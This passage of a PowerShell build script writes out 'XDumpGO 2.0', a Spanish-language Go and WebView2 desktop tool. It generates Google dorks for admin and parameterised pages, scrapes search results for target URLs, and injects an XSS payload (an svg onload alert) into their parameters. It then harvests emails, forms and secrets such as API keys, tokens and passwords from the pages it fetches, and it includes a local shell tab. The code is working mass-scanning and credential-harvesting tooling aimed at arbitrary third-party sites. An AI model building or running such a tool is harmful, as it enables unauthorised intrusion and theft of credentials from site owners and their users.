	reForm    = regexp.MustCompile(`(?is)<form[^>]*>`)
	reScript  = regexp.MustCompile(`(?is)<script[^>]+src="([^"]+)"`)
	reComment = regexp.MustCompile(`(?s)<!--(.*?)-->`)
	reSecret  = regexp.MustCompile(`(?i)(aws[_\-]?access[_\-]?key|api[_\-]?key|access[_\-]?token|secret|password|passwd|bearer)\s*[:=]\s*["']?([A-Za-z0-9_\-./+=]{8,128})`)
)

// StartDump voltea una URL por ID (o todas si id == "").
func (e *Engine) StartDump(id, cfg string) string {
	var c DumpCfg
	if err := json.Unmarshal([]byte(cfg), &c); err != nil {
		return marshal(Resp{OK: false, Error: err.Error()})
	}
	st := e.settings()
	if c.Workers <= 0 {
		c.Workers = st.Workers
	}
	if c.MaxURLs <= 0 {
		c.MaxURLs = 100
	}

	e.mu.Lock()
	e.dumps = nil // corrida limpia
	var targets []URLItem
	if id != "" {
		if n, err := strconv.Atoi(strings.TrimSpace(id)); err == nil {
			for _, u := range e.urls {
				if u.ID == n {
					targets = append(targets, u)
					break
				}
			}
		}
	} else {
		for _, u := range e.urls {
			if c.OnlyOK && !u.OK {
				continue
			}
			targets = append(targets, u)
			if len(targets) >= c.MaxURLs {
				break
			}
		}
	}
	e.mu.Unlock()
	if len(targets) == 0 {
		return marshal(Resp{OK: false, Error: "sin URLs para dump"})
	}

	ctx := e.startJob("dump", len(targets))
	go func() {
		defer e.endJob("dump")
		e.parallel(ctx, c.Workers, len(targets), func(ctx context.Context, i int) {
			e.dumpURL(ctx, targets[i], st.UserAgent)
			atomic.AddInt64(&e.done, 1)
		})
	}()
	return marshal(Resp{OK: true, Count: len(targets)})
}

// StartDumpAll voltea todas las URLs.
func (e *Engine) StartDumpAll(cfg string) string {
	return e.StartDump("", cfg)
}

func (e *Engine) dumpURL(ctx context.Context, u URLItem, ua string) {
	t0 := time.Now()
	status, body, err := e.fetch(ctx, u.Raw, ua)
	e.markURL(u.ID, status)
	d := Dump{
		ID:         u.ID,
		URL:        u.Raw,
		Status:     status,
		Size:       len(body),
		DurationMs: time.Since(t0).Milliseconds(),
		Emails:     []string{},
		Links:      []string{},
		Forms:      []string{},
		JSFiles:    []string{},
		Secrets:    []string{},
		Comments:   []string{},
	}
	if err != nil {
		d.Title = "error: " + err.Error()
	} else {
		d.Title = firstMatch(reTitle, body)
		d.Emails = capped(reEmail.FindAllString(body, 100), 100)
		d.Links = cappedAttr(reLink, body, 200)
		d.Forms = capped(reForm.FindAllString(body, 50), 50)
		d.JSFiles = cappedAttr(reScript, body, 100)
		d.Secrets = capped(reSecret.FindAllString(body, 100), 100)
		for _, m := range reComment.FindAllStringSubmatch(body, -1) {
			if len(m) > 1 {
				c := strings.TrimSpace(m[1])
				if c != "" {
					d.Comments = append(d.Comments, c)
					if len(d.Comments) >= 50 {
						break
					}
				}
			}
		}
	}
	e.mu.Lock()
	e.dumps = append(e.dumps, d)
	e.mu.Unlock()
}

func capped(xs []string, max int) []string {
	if len(xs) > max {
		return xs[:max]
	}
	if xs == nil {
		return []string{}
	}
	return xs
}

func cappedAttr(re *regexp.Regexp, s string, max int) []string {
	seen := make(map[string]bool)
	var out []string
	for _, m := range re.FindAllStringSubmatch(s, -1) {
		if len(m) < 2 {
			continue
		}
		v := strings.TrimSpace(m[1])
		if v == "" || seen[v] {
			continue
		}
		seen[v] = true
		out = append(out, v)
		if len(out) >= max {
			break
		}
	}
	return out
}

func firstMatch(re *regexp.Regexp, s string) string {
	m := re.FindStringSubmatch(s)
	if len(m) > 1 {
		return strings.TrimSpace(m[1])
	}
	return ""
}
'@

Write-File (Join-Path (Join-Path $root "web") "index.html") @'
<!doctype html>
<html lang="es">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>XDumpGO 2.0</title>
<link rel="stylesheet" href="style.css">
</head>
<body>
<header>
  <div class="brand">⚡ XDumpGO <span class="ver">2.0</span><span class="by">Quartz Inc.</span></div>
  <div class="stats">
    <span id="st-run" class="pill">idle</span>
    <span id="st-prog" class="stat"></span>
    <span id="st-speed" class="stat"></span>
    <span id="st-counts" class="stat"></span>
  </div>
  <button id="btn-stop" class="btn danger" title="Detener job en curso">■ Stop</button>
</header>

<nav>
  <button class="tab active" data-tab="dorks">1 · Dorks</button>
  <button class="tab" data-tab="parse">2 · Parse</button>
  <button class="tab" data-tab="inject">3 · Inject</button>
  <button class="tab" data-tab="dump">4 · Dump</button>
  <button class="tab" data-tab="shell">5 · Shell</button>
  <button class="tab" data-tab="settings">⚙ Ajustes</button>
</nav>

<main>
  <section id="tab-dorks" class="panel active">
    <div class="grid2">
      <div class="card">
        <h3>Generador de dorks</h3>
        <label>Keywords (una por línea)</label>
        <textarea id="d-words" rows="7" spellcheck="false">inurl:admin
inurl:login
inurl:php?id=
intitle:"intranet"
inurl:config ext:php</textarea>
        <label>Dominioms (uno por línea · vacío = dorks globales)</label>
        <textarea id="d-domains" rows="4" spellcheck="false">example.com</textarea>
        <label>Parámetros (separados por espacio, para modo inurl)</label>
        <input id="d-params" value="id q page s search file p">
        <div class="row">
          <label class="chk"><input type="checkbox" id="d-mode-site" checked> site:dom + keyword</label>
          <label class="chk"><input type="checkbox" id="d-mode-inurl"> site:dom + inurl:param</label>
        </div>
        <div class="row">
          <div class="grow">
            <label>Máximo de dorks</label>
            <input id="d-max" type="number" value="300" min="1" max="5000">
          </div>
          <button id="btn-dorks" class="btn">⚡ Generar</button>
        </div>
      </div>
      <div class="card">
        <h3>Dorks generadas (<span id="d-count">0</span>)</h3>
        <div class="actions">
          <button id="btn-copy-dorks" class="btn small">Copiar todas</button>
          <button id="btn-export-dorks" class="btn small">Exportar .txt</button>
        </div>
        <div id="dork-list" class="list"></div>
      </div>
    </div>
  </section>

  <section id="tab-parse" class="panel">
    <div class="grid2">
      <div class="card">
        <h3>Parseo de resultados</h3>
        <p class="hint">Busca en Google/Bing con los dorks y extrae las URLs candidatas.
        Si Google da captcha/consent, cambia a Bing o usa un proxy (Ajustes).</p>
        <label>Dorks personalizadas (opcional, una por línea · vacío = usar generadas)</label>
        <textarea id="p-dorks" rows="4" spellcheck="false"></textarea>
        <div class="row">
          <div>
            <label>Motor</label>
            <select id="p-engine">
              <option value="google">Google</option>
              <option value="bing">Bing</option>
            </select>
          </div>
          <div>
            <label>Workers</label>
            <input id="p-workers" type="number" value="8" min="1" max="64">
          </div>
          <div>
            <label>Resultados/dork</label>
            <input id="p-perdork" type="number" value="10" min="1" max="50">
          </div>
        </div>
        <button id="btn-parse" class="btn">🔎 Iniciar parse</button>
      </div>
      <div class="card">
        <h3>URLs candidatas (<span id="u-count">0</span>)</h3>
        <div class="actions">
          <label class="chk"><input type="checkbox" id="u-only-params"> solo con parámetros</label>
          <button id="btn-copy-urls" class="btn small">Copiar</button>
          <button id="btn-export-urls" class="btn small">Exportar .txt</button>
        </div>
        <div id="url-list" class="list table-wrap"></div>
      </div>
    </div>
  </section>

  <section id="tab-inject" class="panel">
    <div class="grid2">
      <div class="card">
        <h3>Inyección de payloads</h3>
        <p class="hint">Sustituye el valor de cada parámetro por el payload y verifica si se refleja
        en la respuesta (marcador <code>xqz123</code> = sin falsos positivos).</p>
        <div class="row">
          <div>
            <label>Workers</label>
            <input id="i-workers" type="number" value="8" min="1" max="64">
          </div>
          <div>
            <label>Máx. URLs</label>
            <input id="i-maxurls" type="number" value="200" min="1">
          </div>
          <div>
            <label>Máx. parámetros/URL</label>
            <input id="i-maxparams" type="number" value="3" min="1" max="10">
          </div>
        </div>
        <label>Payloads (uno por línea, se prueban en orden hasta reflejo)</label>
        <textarea id="i-payloads" rows="3" spellcheck="false">xqz123"><svg/onload=alert(document.domain)></textarea>
        <button id="btn-inject" class="btn">💉 Inyectar</button>
      </div>
      <div class="card">
        <h3>Reflejos detectados (<span id="inj-count">0</span>)</h3>
        <div class="actions">
          <label class="chk"><input type="checkbox" id="inj-only-ref" checked> solo reflejados</label>
          <button id="btn-export-injects" class="btn small">Exportar .txt</button>
        </div>
        <div id="inject-list" class="list"></div>
      </div>
    </div>
  </section>

  <section id="tab-dump" class="panel">
    <div class="grid2">
      <div class="card">
        <h3>Dump de páginas</h3>
        <p class="hint">Descarga cada URL y extrae: título, emails, links, formularios, JS,
        secretos (AWS/API/tokens/passwords) y comentarios HTML.</p>
        <div class="row">
          <div>
            <label>Workers</label>
            <input id="dm-workers" type="number" value="8" min="1" max="64">
          </div>
          <div>
            <label>Máx. URLs</label>
            <input id="dm-maxurls" type="number" value="100" min="1">
          </div>
        </div>
        <label>Dump de una URL específica (ID de la lista, opcional)</label>
        <input id="dm-id" placeholder="ej. 12" value="">
        <div class="row">
          <button id="btn-dump" class="btn">📦 Dump (ID)</button>
          <button id="btn-dump-all" class="btn">📦 Dump all</button>
          <button id="btn-export-dumps" class="btn small">Exportar .json</button>
        </div>
      </div>
      <div class="card">
        <h3>Resultados del dump (<span id="dump-count">0</span>)</h3>
        <div id="dump-list" class="list"></div>
      </div>
    </div>
  </section>

  <section id="tab-shell" class="panel">
    <div class="grid2">
      <div class="card">
        <h3>Shell local</h3>
        <label>Comando</label>
        <input id="sh-cmd" value="dir" spellcheck="false">
        <label>Argumentos (separados por espacio)</label>
        <input id="sh-args" value="" spellcheck="false">
        <label>Directorio (opcional)</label>
        <input id="sh-cwd" value="" spellcheck="false">
        <button id="btn-shell" class="btn">▶ Ejecutar</button>
      </div>
      <div class="card">
        <h3>Salidas (<span id="sh-count">0</span>)</h3>
        <div id="shell-list" class="list"></div>
      </div>
    </div>
  </section>

  <section id="tab-settings" class="panel">
    <div class="grid2">
      <div class="card">
        <h3>Ajustes</h3>
        <p class="hint">Se guardan en <code>xdumpgo2.settings.json</code> junto al ejecutable.
        Proxy recomendado: <code>http://user:pass@host:port</code>.</p>
        <label>JSON de ajustes</label>
        <textarea id="set-json" rows="16" spellcheck="false"></textarea>
        <div class="row">
          <button id="btn-save-settings" class="btn">💾 Guardar</button>
          <button id="btn-load-settings" class="btn small">Recargar</button>
        </div>
      </div>
      <div class="card">
        <h3>Log</h3>
        <div id="log-list" class="list mono"></div>
      </div>
    </div>
  </section>
</main>

<div id="toast"></div>
<script src="app.js"></script>
</body>
</html>
'@

Write-File (Join-Path (Join-Path $root "web") "app.js") @'
"use strict";

const gw = window.goWebView;

const $ = (s) => document.querySelector(s);
const $$ = (s) => Array.from(document.querySelectorAll(s));

// parseRet tolera que el bridge devuelva string JSON u objeto ya parseado.
function parseRet(v) {
  if (v === undefined || v === null) return v;
  if (typeof v === "object") return v;
  try { return JSON.parse(v); } catch (e) { return v; }
}

function call(name, ...args) {
  if (!gw || typeof gw[name] !== "function") {
    throw new Error("goWebView." + name + " no disponible (ejecuta xdumpgo2.exe)");
  }
  return gw[name](...args);
}
const callJSON = (name, obj) => parseRet(call(name, JSON.stringify(obj)));
const getJSON = (name) => parseRet(call(name));
const results = (kind) => parseRet(call("getResults", kind));

let toastTimer = null;
function toast(msg, kind = "info") {
  const t = $("#toast");
  t.textContent = msg;
  t.className = "show " + kind;
  clearTimeout(toastTimer);
  toastTimer = setTimeout(() => (t.className = ""), 3500);
}

function lines(v) {
  return v.split(/\r?\n/).map((s) => s.trim()).filter(Boolean);
}

function esc(s) {
  return String(s == null ? "" : s).replace(/[&<>"']/g, (c) => ({
    "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;",
  }[c]));
}

function copyText(t) {
  if (!t) { toast("nada que copiar", "err"); return; }
  const done = () => toast("copiado al portapapeles", "ok");
  if (navigator.clipboard && navigator.clipboard.writeText) {
    navigator.clipboard.writeText(t).then(done, done);
  } else {
    const ta = document.createElement("textarea");
    ta.value = t; document.body.appendChild(ta); ta.select();
    document.execCommand("copy"); ta.remove(); done();
  }
}

function exportText(name, content) {
  if (!content) { toast("nada que exportar", "err"); return; }
  try {
    const r = parseRet(call("exportFile", name, content));
    if (r && r.ok) {
      toast("Guardado en tu PC: " + r.path, "ok");
      call("openFile", r.path);
    } else toast((r && r.error) || "error", "err");
  } catch (e) { toast(e.message, "err"); }
}

// ---------- Tabs ----------
let currentTab = "dorks";
$$(".tab").forEach((b) => b.addEventListener("click", () => {
  $$(".tab").forEach((x) => x.classList.remove("active"));
  $$(".panel").forEach((x) => x.classList.remove("active"));
  b.classList.add("active");
  $("#tab-" + b.dataset.tab).classList.add("active");
  currentTab = b.dataset.tab;
  renderTab(currentTab);
}));

function renderTab(tab) {
  if (tab === "dorks") renderDorks();
  if (tab === "parse") renderURLs();
  if (tab === "inject") renderInjects();
  if (tab === "dump") renderDumps();
  if (tab === "shell") renderShell();
  if (tab === "settings") renderLogs();
}

// ---------- Stats (polling) ----------
function updateStats(s) {
  const run = $("#st-run");
  if (s.running) {
    run.textContent = "● " + s.job.name;
    run.classList.add("on");
    const pct = s.job.total ? Math.round((s.job.done / s.job.total) * 100) : 0;
    $("#st-prog").textContent = s.job.done + "/" + s.job.total + " (" + pct + "%)";
    $("#st-speed").textContent = s.job.speed.toFixed(1) + "/s · " + s.elapsedSec.toFixed(0) + "s";
  } else {
    run.textContent = "idle";
    run.classList.remove("on");
    $("#st-prog").textContent = "";
    $("#st-speed").textContent = "";
  }
  $("#st-counts").textContent =
    "dorks " + s.dorks + " · urls " + s.urls +
    " · inject " + s.injects + " (" + s.reflected + " reflejo)" +
    " · dumps " + s.dumps;
}

setInterval(() => {
  try {
    const s = getJSON("getStats");
    if (!s || typeof s !== "object") return;
    updateStats(s);
    if (s.running) renderTab(currentTab);
  } catch (e) { /* UI aún cargando */ }
}, 900);

// ---------- Dorks ----------
function renderDorks() {
  let ds = results("dorks");
  if (!Array.isArray(ds)) ds = [];
  $("#d-count").textContent = ds.length;
  const el = $("#dork-list");
  if (!ds.length) { el.innerHTML = '<div class="empty">Sin dorks todavía.</div>'; return; }
  const MAX = 400;
  el.innerHTML = ds.slice(0, MAX).map((d) =>
    '<div class="row-item"><code>' + esc(d.text) + "</code></div>"
  ).join("") + (ds.length > MAX ? '<div class="empty">…y ' + (ds.length - MAX) + " más</div>" : "");
}

$("#btn-dorks").addEventListener("click", () => {
  try {
    const modes = [];
    if ($("#d-mode-site").checked) modes.push("site");
    if ($("#d-mode-inurl").checked) modes.push("inurl");
    const r = callJSON("genDorks", {
      keywords: lines($("#d-words").value),
      domains: lines($("#d-domains").value),
      params: $("#d-params").value.split(/\s+/).filter(Boolean),
      max: +$("#d-max").value || 300,
      modes: modes,
    });
    if (r.ok) { toast(r.count + " dorks generadas", "ok"); renderDorks(); }
    else toast(r.error || "error", "err");
  } catch (e) { toast(e.message, "err"); }
});

$("#btn-copy-dorks").addEventListener("click", () => {
  const ds = results("dorks");
  copyText(Array.isArray(ds) ? ds.map((d) => d.text).join("\n") : "");
});

$("#btn-export-dorks").addEventListener("click", () => {
  const ds = results("dorks");
  exportText("dorks.txt", Array.isArray(ds) ? ds.map((d) => d.text).join("\n") : "");
});

// ---------- Parse / URLs ----------
function renderURLs() {
  let us = results("urls");
  if (!Array.isArray(us)) us = [];
  const onlyP = $("#u-only-params").checked;
  const view = onlyP ? us.filter((u) => u.params && u.params.length) : us;
  $("#u-count").textContent = view.length;
  const el = $("#url-list");
  if (!view.length) { el.innerHTML = '<div class="empty">Sin URLs todavía.</div>'; return; }
  const MAX = 300;
  el.innerHTML =
    '<table><thead><tr><th>ID</th><th>Host</th><th>Path</th><th>Params</th><th>Source</th></tr></thead><tbody>' +
    view.slice(0, MAX).map((u) =>
      "<tr><td>" + u.id + "</td><td>" + esc(u.host) + "</td><td>" + esc(u.path) +
      "</td><td>" + esc((u.params || []).join(",")) +
      "</td><td class='dim'>" + esc(u.source) + "</td></tr>"
    ).join("") +
    "</tbody></table>" +
    (view.length > MAX ? '<div class="empty">…y ' + (view.length - MAX) + " más</div>" : "");
}

$("#u-only-params").addEventListener("change", renderURLs);

$("#btn-parse").addEventListener("click", () => {
  try {
    const r = callJSON("startParse", {
      dorks: lines($("#p-dorks").value),
      engine: $("#p-engine").value,
      workers: +$("#p-workers").value || 8,
      perDork: +$("#p-perdork").value || 10,
    });
    if (r.ok) toast("Parse iniciado (" + r.count + " dorks)", "ok");
    else toast(r.error || "error", "err");
  } catch (e) { toast(e.message, "err"); }
});

$("#btn-copy-urls").addEventListener("click", () => {
  const us = results("urls");
  copyText(Array.isArray(us) ? us.map((u) => u.raw).join("\n") : "");
});

$("#btn-export-urls").addEventListener("click", () => {
  const us = results("urls");
  exportText("urls.txt", Array.isArray(us) ? us.map((u) => u.raw).join("\n") : "");
});

// ---------- Inject ----------
function renderInjects() {
  let js = results("injects");
  if (!Array.isArray(js)) js = [];
  const onlyRef = $("#inj-only-ref").checked;
  const view = onlyRef ? js.filter((x) => x.reflected) : js;
  $("#inj-count").textContent = view.length;
  const el = $("#inject-list");
  if (!view.length) { el.innerHTML = '<div class="empty">Sin inyecciones todavía.</div>'; return; }
  const MAX = 200;
  el.innerHTML = view.slice(0, MAX).map((x) =>
    '<div class="inj">' +
      '<div class="inj-head"><span class="badge ' + (x.reflected ? "ok" : "no") + '">' +
        (x.reflected ? "REFLEJADO" : "no reflejo") + "</span> <b>" + esc(x.param) +
        "</b> · HTTP " + (x.status || "-") + "</div>" +
      '<code class="inj-url">' + esc(x.url) + "</code>" +
      (x.snippet ? '<pre class="snippet">' + esc(x.snippet) + "</pre>" : "") +
    "</div>"
  ).join("");
}

$("#inj-only-ref").addEventListener("change", renderInjects);

$("#btn-inject").addEventListener("click", () => {
  try {
    const r = callJSON("startInject", {
      workers: +$("#i-workers").value || 8,
      maxUrls: +$("#i-maxurls").value || 200,
      maxParams: +$("#i-maxparams").value || 3,
      payloads: lines($("#i-payloads").value),
    });
    if (r.ok) toast("Inyección iniciada (" + r.count + " URLs)", "ok");
    else toast(r.error || "error", "err");
  } catch (e) { toast(e.message, "err"); }
});

$("#btn-export-injects").addEventListener("click", () => {
  const js = results("injects");
  if (!Array.isArray(js) || !js.length) { toast("nada que exportar", "err"); return; }
  const txt = js.filter((x) => x.reflected).map((x) =>
    "REFLEJADO | " + x.param + " | " + x.url + "\n  contexto: " + x.snippet
  ).join("\n");
  exportText("injections.txt", txt || "(sin reflejos)");
});

// ---------- Dump ----------
function renderDumps() {
  let ds = results("dumps");
  if (!Array.isArray(ds)) ds = [];
  $("#dump-count").textContent = ds.length;
  const el = $("#dump-list");
  if (!ds.length) { el.innerHTML = '<div class="empty">Sin dumps todavía.</div>'; return; }
  const MAX = 100;
  el.innerHTML = ds.slice(0, MAX).map((d) => {
    const items = [];
    if (d.emails && d.emails.length) items.push("<b>Emails:</b> " + esc(d.emails.join(", ")));
    if (d.secrets && d.secrets.length) items.push("<b>Secretos:</b> " + esc(d.secrets.join(" | ")));
    if (d.forms && d.forms.length) items.push("<b>Forms:</b> " + esc(d.forms.slice(0, 3).join(" | ")));
    if (d.jsFiles && d.jsFiles.length) items.push("<b>JS:</b> " + esc(d.jsFiles.slice(0, 5).join(" | ")));
    if (d.links && d.links.length) items.push("<b>Links:</b> " + d.links.length + " (ver export)");
    if (d.comments && d.comments.length) items.push("<b>Comentarios:</b> " + esc(d.comments.slice(0, 2).join(" | ")));
    return (
      '<details class="dump">' +
        "<summary>" + esc(d.title || d.url) +
        ' <span class="dim">HTTP ' + d.status + " · " + d.size + "B · " + d.durationMs + "ms</span></summary>" +
        '<div class="dim small">' + esc(d.url) + "</div>" +
        '<div class="dump-body">' + (items.join("<br>") || "<span class='dim'>sin datos extraídos</span>") + "</div>" +
      "</details>"
    );
  }).join("");
}

function dumpCfg() {
  return {
    workers: +$("#dm-workers").value || 8,
    maxUrls: +$("#dm-maxurls").value || 100,
  };
}

$("#btn-dump").addEventListener("click", () => {
  try {
    const r = parseRet(call("startDump", $("#dm-id").value.trim(), JSON.stringify(dumpCfg())));
    if (r.ok) toast("Dump iniciado (" + r.count + " URLs)", "ok");
    else toast(r.error || "error", "err");
  } catch (e) { toast(e.message, "err"); }
});

$("#btn-dump-all").addEventListener("click", () => {
  try {
    const r = callJSON("startDumpAll", dumpCfg());
    if (r.ok) toast("Dump all iniciado (" + r.count + " URLs)", "ok");
    else toast(r.error || "error", "err");
  } catch (e) { toast(e.message, "err"); }
});

$("#btn-export-dumps").addEventListener("click", () => {
  const ds = results("dumps");
  if (!Array.isArray(ds) || !ds.length) { toast("nada que exportar", "err"); return; }
  exportText("dumps.json", JSON.stringify(ds, null, 2));
});

// ---------- Shell ----------
function renderShell() {
  let ss = results("shell");
  if (!Array.isArray(ss)) ss = [];
  $("#sh-count").textContent = ss.length;
  const el = $("#shell-list");
  if (!ss.length) { el.innerHTML = '<div class="empty">Sin salidas todavía.</div>'; return; }
  el.innerHTML = ss.slice(-20).reverse().map((s) =>
    '<div class="shell"><code class="sh-cmd">$ ' + esc(s.cmd) + " <span class='dim'>[exit " + s.exit + "]</span></code>" +
    '<pre class="sh-out">' + esc(s.out || s.err || "(sin salida)") + "</pre></div>"
  ).join("");
}

$("#btn-shell").addEventListener("click", () => {
  try {
    const r = callJSON("startShell", {
      cmd: $("#sh-cmd").value.trim(),
      args: $("#sh-args").value.split(/\s+/).filter(Boolean),
      cwd: $("#sh-cwd").value.trim(),
    });
    if (r.ok) toast("comando lanzado", "ok");
    else toast(r.error || "error", "err");
  } catch (e) { toast(e.message, "err"); }
});

// ---------- Settings / Log ----------
function renderSettings() {
  try {
    const s = getJSON("getSettings");
    if (document.activeElement !== $("#set-json") && s && typeof s === "object") {
      $("#set-json").value = JSON.stringify(s, null, 2);
    }
  } catch (e) { /* ignore */ }
}

$("#btn-save-settings").addEventListener("click", () => {
  try {
    const r = parseRet(call("saveSettings", $("#set-json").value));
    if (r.ok) toast("ajustes guardados", "ok");
    else toast(r.error || "error", "err");
  } catch (e) { toast(e.message, "err"); }
});

$("#btn-load-settings").addEventListener("click", () => {
  try {
    const s = getJSON("getSettings");
    $("#set-json").value = JSON.stringify(s, null, 2);
    toast("ajustes recargados", "ok");
  } catch (e) { toast(e.message, "err"); }
});

function renderLogs() {
  let ls = results("logs");
  if (!Array.isArray(ls)) ls = [];
  const el = $("#log-list");
  el.innerHTML = ls.slice(-150).reverse().map((l) =>
    '<div class="log ' + esc(l.kind) + '"><span class="dim">' + esc(l.ts) + "</span> " + esc(l.msg) + "</div>"
  ).join("");
}

// ---------- Stop ----------
$("#btn-stop").addEventListener("click", () => {
  try {
    parseRet(call("stopAll"));
    toast("stop enviado", "info");
  } catch (e) { toast(e.message, "err"); }
});

// ---------- Init ----------
if (!gw) {
  const d = document.createElement("div");
  d.style.cssText = "background:#d29922;color:#000;padding:8px 16px;font-size:12px";
  d.textContent = "Modo navegador: ejecuta xdumpgo2.exe para activar las funciones Go.";
  document.body.prepend(d);
}
renderSettings();
renderDorks();
renderURLs();
renderInjects();
renderDumps();
renderShell();
renderLogs();
'@

Write-File (Join-Path (Join-Path $root "web") "style.css") @'
:root {
  --bg: #0d1117;
  --bg2: #161b22;
  --bg3: #1c2330;
  --fg: #e6edf3;
  --dim: #8b949e;
  --acc: #58a6ff;
  --ok: #3fb950;
  --err: #f85149;
  --warn: #d29922;
  --border: #30363d;
}
* { box-sizing: border-box; }
html, body { margin: 0; height: 100%; }
body {
  background: var(--bg);
  color: var(--fg);
  font: 13px/1.45 "Segoe UI", system-ui, sans-serif;
  display: flex;
  flex-direction: column;
}
header {
  display: flex; align-items: center; gap: 14px;
  padding: 10px 16px;
  background: var(--bg2);
  border-bottom: 1px solid var(--border);
}
.brand { font-size: 16px; font-weight: 700; letter-spacing: .3px; white-space: nowrap; }
.brand .ver { color: var(--acc); }
.brand .by { color: var(--dim); font-weight: 400; font-size: 11px; margin-left: 8px; }
.stats { display: flex; gap: 12px; align-items: center; flex: 1; color: var(--dim); font-size: 12px; overflow: hidden; }
.pill {
  background: var(--bg3); border: 1px solid var(--border);
  padding: 2px 10px; border-radius: 999px; color: var(--dim); white-space: nowrap;
}
.pill.on { color: var(--ok); border-color: var(--ok); }
nav {
  display: flex; gap: 4px; padding: 8px 16px 0;
  background: var(--bg2); border-bottom: 1px solid var(--border);
}
.tab {
  background: transparent; border: 1px solid transparent; border-bottom: none;
  color: var(--dim); padding: 7px 14px; cursor: pointer; border-radius: 8px 8px 0 0;
  font-size: 13px;
}
.tab:hover { color: var(--fg); }
.tab.active { background: var(--bg); color: var(--fg); border-color: var(--border); }
main { flex: 1; overflow: auto; padding: 16px; }
.panel { display: none; }
.panel.active { display: block; }
.grid2 { display: grid; grid-template-columns: 380px 1fr; gap: 14px; align-items: start; }
.card {
  background: var(--bg2); border: 1px solid var(--border);
  border-radius: 10px; padding: 14px;
}
.card h3 { margin: 0 0 10px; font-size: 14px; }
label { display: block; color: var(--dim); font-size: 11px; margin: 10px 0 4px; text-transform: uppercase; letter-spacing: .4px; }
input, textarea, select {
  width: 100%; background: var(--bg); color: var(--fg);
  border: 1px solid var(--border); border-radius: 6px; padding: 7px 9px;
  font: 12px/1.4 Consolas, "Cascadia Mono", monospace;
}
textarea { resize: vertical; }
.row { display: flex; gap: 10px; align-items: flex-end; margin-top: 10px; }
.row > div { flex: 1; }
.chk { display: flex; align-items: center; gap: 6px; color: var(--fg); font-size: 12px; text-transform: none; margin: 0; }
.chk input { width: auto; }
.btn {
  background: var(--acc); color: #04121f; border: none; border-radius: 6px;
  padding: 8px 14px; cursor: pointer; font-weight: 600; font-size: 13px;
}
.btn:hover { filter: brightness(1.1); }
.btn.small { padding: 4px 10px; font-size: 11px; font-weight: 500; }
.btn.danger { background: var(--err); color: #fff; }
.actions { display: flex; gap: 8px; align-items: center; margin-bottom: 8px; flex-wrap: wrap; }
.actions label { margin: 0; }
.hint { color: var(--dim); font-size: 11px; margin: 0 0 6px; }
code { background: var(--bg3); padding: 1px 5px; border-radius: 4px; font-size: 11px; }
.list { max-height: 62vh; overflow: auto; border: 1px solid var(--border); border-radius: 8px; background: var(--bg); }
.empty { color: var(--dim); padding: 14px; text-align: center; font-size: 12px; }
.row-item { padding: 5px 10px; border-bottom: 1px solid var(--border); }
.table-wrap { border: none; background: transparent; }
table { width: 100%; border-collapse: collapse; font-size: 12px; }
th, td { text-align: left; padding: 5px 8px; border-bottom: 1px solid var(--border); vertical-align: top; }
th { position: sticky; top: 0; background: var(--bg2); color: var(--dim); font-size: 11px; text-transform: uppercase; }
.dim { color: var(--dim); }
.small { font-size: 11px; }
.inj { border-bottom: 1px solid var(--border); padding: 8px 10px; }
.inj-head { margin-bottom: 4px; }
.badge { padding: 1px 8px; border-radius: 999px; font-size: 10px; font-weight: 700; }
.badge.ok { background: rgba(63,185,80,.15); color: var(--ok); }
.badge.no { background: rgba(139,148,158,.15); color: var(--dim); }
.inj-url { display: block; word-break: break-all; margin-bottom: 4px; }
pre.snippet { margin: 4px 0 0; background: var(--bg3); border-radius: 6px; padding: 6px 8px; font-size: 11px; white-space: pre-wrap; word-break: break-all; }
details.dump { border-bottom: 1px solid var(--border); padding: 6px 10px; }
details.dump summary { cursor: pointer; }
.dump-body { margin-top: 6px; font-size: 12px; word-break: break-all; }
.shell { border-bottom: 1px solid var(--border); padding: 8px 10px; }
.sh-cmd { display: block; margin-bottom: 4px; }
pre.sh-out { margin: 0; background: var(--bg3); border-radius: 6px; padding: 8px; font-size: 11px; white-space: pre-wrap; word-break: break-all; max-height: 200px; overflow: auto; }
.mono { font-family: Consolas, monospace; }
.log { padding: 2px 10px; border-bottom: 1px solid rgba(48,54,61,.5); font-size: 11px; }
.log.ok { color: var(--ok); }
.log.err { color: var(--err); }
.log.warn { color: var(--warn); }
#toast {
  position: fixed; right: 16px; bottom: 16px; max-width: 460px;
  background: var(--bg3); border: 1px solid var(--border); color: var(--fg);
  padding: 10px 14px; border-radius: 8px; opacity: 0; pointer-events: none;
  transition: opacity .2s; font-size: 12px; z-index: 99;
}
#toast.show { opacity: 1; }
#toast.ok { border-color: var(--ok); }
#toast.err { border-color: var(--err); }
'@

Write-File (Join-Path $root "README.md") @'
# XDumpGO 2.0 (Quartz Inc.)

App de escritorio (WebView2): dorking, parseo, inyección XSS, dump de páginas y shell.

## Compilar
    go build -ldflags "-s -w" -o xdumpgo2.exe .

Requiere Go 1.22+ y el runtime WebView2 (preinstalado en Windows 10/11).

## Flujo
1. Dorks  -> genera dorks (site: / inurl:).
2. Parse  -> busca en Google/Bing y extrae URLs candidatas.
3. Inject -> inyecta payloads y detecta reflejos (marcador xqz123).
4. Dump   -> extrae emails/links/JS/secretos/comentarios de cada página.
5. Shell  -> ejecuta comandos locales.

## Exportar (descarga a tu PC)
Cada pestaña tiene "Exportar": guarda en .\exports\ junto al exe y abre el
archivo en el Explorador. Ajustes persistentes: xdumpgo2.settings.json.
'@

Write-Host ""
Write-Host "Proyecto creado en: $root" -ForegroundColor Cyan

if (Get-Command go -ErrorAction SilentlyContinue) {
  Write-Host "Compilando..." -ForegroundColor Cyan
  Push-Location $root
  try {
    go mod tidy
    if ($LASTEXITCODE -ne 0) {
      Write-Host "go mod tidy falló (¿sin internet?), usando go.mod existente" -ForegroundColor Yellow
    }
    go build -ldflags "-s -w" -o xdumpgo2.exe .
    if ($LASTEXITCODE -eq 0) {
      Write-Host "OK: $(Join-Path $root 'xdumpgo2.exe')" -ForegroundColor Green
    } else {
      Write-Host "Error de compilación (revisa la salida de go build)" -ForegroundColor Red
    }
  } finally {
    Pop-Location
  }
} else {
  Write-Host "Go no encontrado en PATH. Instala Go 1.22+ y ejecuta:" -ForegroundColor Yellow
  Write-Host "  cd $root"
  Write-Host "  go build -ldflags `"-s -w`" -o xdumpgo2.exe ."
}
Write-Host ""
Write-Host "Listo. Ejecuta xdumpgo2.exe cuando quieras." -ForegroundColor Cyan
